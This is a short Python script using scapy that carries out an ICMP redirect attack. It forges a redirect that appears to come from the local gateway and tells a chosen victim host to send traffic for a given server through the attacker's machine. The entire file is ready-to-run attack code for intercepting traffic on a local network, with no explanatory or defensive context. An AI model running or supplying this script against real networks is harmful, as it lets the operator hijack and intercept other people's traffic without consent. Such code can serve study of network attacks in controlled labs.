import sys

from scapy.arch import conf, get_if_addr
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import sendp

if len(sys.argv) != 4:
    print(f'Usage: {sys.argv[0]} <interface> <victim IP> <server IP>')
    exit(1)

iface, victim, server = sys.argv[1:]

attacker = get_if_addr(iface)
gw = conf.route.route()[2]

sendp(
    IP(src=gw, dst=victim)
    / ICMP(type=5, code=1, gw=attacker)
    / IP(src=victim, dst=server)
    / ICMP(),
    iface=iface,
)
